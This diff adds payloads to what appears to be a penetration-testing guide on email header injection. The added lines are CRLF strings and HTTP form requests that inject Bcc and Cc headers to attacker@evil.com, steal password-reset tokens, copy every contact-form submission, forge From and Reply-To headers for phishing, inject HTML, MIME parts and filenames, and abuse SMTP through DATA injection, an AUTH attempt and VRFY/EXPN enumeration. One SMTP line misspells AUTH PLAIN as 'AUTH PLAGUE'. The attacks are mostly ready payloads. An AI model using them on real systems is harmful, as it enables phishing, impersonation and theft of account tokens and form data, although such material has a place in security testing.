@@ -44,6 +44,27 @@ Inject CRLF (`\r\n`) sequences into form fields that become email headers. When 
 
 ### Standard Payloads
 
+Raw CRLF sequences to inject into any header-mapped field (replace `%0d%0a` with the encoding the form accepts):
+
+```text
+\r\nBcc: attacker@evil.com
+\r\nCc: attacker@evil.com
+\r\nTo: victim@target.com, attacker@evil.com
+\r\nSubject: Injected Subject
+\r\nFrom: admin@target.com
+\r\nReply-To: attacker@evil.com
+\r\nInjected-Header: test
+```
+
+URL-encoded variants for HTTP form fields:
+
+```http
+POST /contact HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=Test%0d%0aX-Test-Injected:%20yes&email=victim@target.com&subject=Hi&message=Hello
+```
+
 
 ### Injection Points
 
@@ -63,6 +84,19 @@ CRLF injection in email contexts allows adding hidden recipients (BCC) or inject
 
 ### BCC Injection — Hidden Recipients
 
+```http
+POST /contact HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=Test%0d%0aBcc:%20attacker@evil.com&email=victim@target.com&subject=Quote%20Request&message=Hello
+```
+
+Single-field variant (email field itself carries the CRLF chain):
+
+```http
+email=victim@target.com%0d%0aBcc: attacker@evil.com
+```
+
 
 - BCC recipients are not visible in the email headers displayed to recipients
 - The original recipient sees a normal email with no trace of the hidden address
@@ -70,10 +104,23 @@ CRLF injection in email contexts allows adding hidden recipients (BCC) or inject
 
 ### CRLF Chain for Full Header Control
 
+```http
+POST /invite HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+friend_email=victim@target.com%0d%0aFrom:%20admin@target.com%0d%0aReply-To:%20attacker@evil.com%0d%0aSubject:%20Urgent:%20Account%20Verification%20Required%0d%0aX-Priority:%201%0d%0aX-Mailer:%20CorporateMailer&your_name=IT%20Support
+```
+
 
 This constructs a complete set of forged headers. The actual envelope sender (MAIL FROM) remains the legitimate server, but displayed headers are attacker-controlled.
 
 ### Content-Type Injection
+
+```http
+email=victim@target.com%0d%0aContent-Type:%20text/html;%20charset=UTF-8%0d%0aContent-Transfer-Encoding:%20base64&subject=Hello
+```
+
+Force HTML rendering, or smuggle a second MIME part via boundary injection (see Body Injection below).
 
 
 ---
@@ -83,6 +130,14 @@ This constructs a complete set of forged headers. The actual envelope sender (MA
 Inject newlines in subject fields to replace the intended subject or add custom headers like `Reply-To`, `X-Priority`, or `List-Unsubscribe`.
 
 ### Payloads
+
+```http
+subject=Hello%0d%0aReply-To:%20attacker@evil.com
+subject=Hello%0d%0aX-Priority:%201
+subject=Hello%0d%0aList-Unsubscribe:%20<mailto:attacker@evil.com>
+subject=Hello%0d%0aInjected-Header:%20test
+subject=Real%20Subject%0d%0aSubject:%20Replaced%20Subject
+```
 
 
 ### Behavior by Mail Library
@@ -102,6 +157,12 @@ Inject newlines in subject fields to replace the intended subject or add custom 
 Forge `From`, `Reply-To`, `Return-Path`, or `Sender` headers to impersonate trusted addresses. The attacker controls what the recipient sees as the sender.
 
 ### Spoofed Headers
+
+```http
+email=victim@target.com%0d%0aFrom:%20ceo@target.com%0d%0aReply-To:%20attacker@evil.com
+email=victim@target.com%0d%0aFrom:%20it-security@target.com%0d%0aSender:%20attacker@evil.com
+email=victim@target.com%0d%0aReturn-Path:%20attacker@evil.com
+```
 
 
 ### Trust Escalation Chain
@@ -123,11 +184,29 @@ Inject HTML, scripts, or additional MIME parts into the email body via CRLF sequ
 
 ### HTML Body Injection
 
+```http
+POST /feedback HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+comment=Regards%0d%0a%0d%0a<html><body><a%20href="http://evil.com/phish">Reset%20your%20password%20now</a></body></html>&email=feedback@target.com&subject=Feedback
+```
+
 
 ### MIME Boundary Injection
 
+```http
+message=Part%20one%0d%0a--BOUNDARY%0d%0aContent-Type:%20text/html;%20charset=UTF-8%0d%0a%0d%0a<h1>Injected%20HTML%20part</h1>%0d%0a--BOUNDARY--
+```
+
+The injected boundary terminates the legitimate part early and appends an attacker-controlled part that mail clients render.
+
 
 ### Attachment Injection (MIME)
+
+```http
+filename="invoice.pdf%0d%0aContent-Type:%20text/html%0d%0aContent-Disposition:%20inline"
+filename="notes.txt%0d%0aContent-Transfer-Encoding:%20base64"
+```
 
 
 ---
@@ -138,6 +217,13 @@ Use injection to CC/BCC an attacker-controlled address, exfiltrating data from p
 
 ### Password Reset Token Exfiltration
 
+```http
+POST /reset-password HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com%0d%0aBcc:%20controlled@attacker.evil
+```
+
 
 - When the server sends a password reset email with a token in the body or URL
 - The attacker receives a copy of the email with the reset token
@@ -145,8 +231,15 @@ Use injection to CC/BCC an attacker-controlled address, exfiltrating data from p
 
 ### Exfiltration via Contact Form
 
+```http
+POST /contact HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=Website%20Visitor%0d%0aCc:%20controlled@attacker.evil&email=visitor@example.com&subject=Question&message=Form%20submission%20content
+```
 
 Every form submission is silently copied to the attacker.
+
 
 ### Data Extraction from Web Apps
 
@@ -161,6 +254,18 @@ Every form submission is silently copied to the attacker.
 If email forms allow file attachments or file names are embedded in headers:
 
 ### Filename Header Injection
+
+```http
+POST /support/ticket HTTP/1.1
+Content-Type: multipart/form-data; boundary=----form
+
+------form
+Content-Disposition: form-data; name="attachment"; filename="report.pdf%0d%0aBcc:%20attacker@evil.com"
+Content-Type: application/pdf
+
+<file bytes>
+------form--
+```
 
 
 ### Malicious Attachment Relay
@@ -177,14 +282,49 @@ If the application directly issues SMTP commands (not using a library), inject S
 
 ### DATA Phase Injection
 
+```text
+$ telnet mx.target.com 25
+220 mx.target.com ESMTP Postfix
+MAIL FROM:<noreply@target.com>
+250 Ok
+RCPT TO:<victim@target.com>
+250 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+From: admin@target.com
+To: victim@target.com
+Bcc: attacker@evil.com
+Subject: Password Reset
+X-Injected-Header: test
+
+Your reset link: https://target.com/reset?token=SECRET
+.
+250 Ok: queued as 8F2A1
+QUIT
+```
 
 ### SMTP AUTH Bypass Attempt
 
+```text
+AUTH PLAGUE AGF0dGFjawBwYXNzd29yZA==      ← AUTH PLAIN base64(user\0pass), attempt mid-stream
+MAIL FROM:<other-user@target.com>          ← relay as a different identity if server trusts session
+```
 
-- Attempt to authenticate as another user during session
-- Only works if SMTP server accepts commands mid-stream
+Base64 payload is `AUTH PLAIN <base64("\0user\0password")>` — try captured or default credentials.
 
 ### SMTP VRFY/EXPN Abuse
+
+```text
+$ telnet mail.target.com 25
+VRFY root
+252 2.0.0 root
+VRFY admin
+550 5.1.1 <admin>: Recipient address rejected
+EXPN all
+250 2.1.5 alice@target.com,bob@target.com
+```
+
+`VRFY` confirms mailbox existence (user enumeration); `EXPN` expands lists/mailing aliases where supported.
 
 
 ---
@@ -198,6 +338,16 @@ If the application directly issues SMTP commands (not using a library), inject S
 - Check if server response includes mail headers (`X-Mailer`, `Message-ID`, `Received`)
 
 ### Step 2: Test for CRLF Injection
+
+```http
+POST /newsletter HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+email=you@test.local%0d%0aX-Test-Injected:%20crlf-works&name=Tester
+```
+
+Then inspect the raw source of the received email (`View original` / `Show headers`) for `X-Test-Injected`.
+
 
 - Submit `test\r\nInjected-Header: test` in each field
 - Check response headers and email received for `Injected-Header`
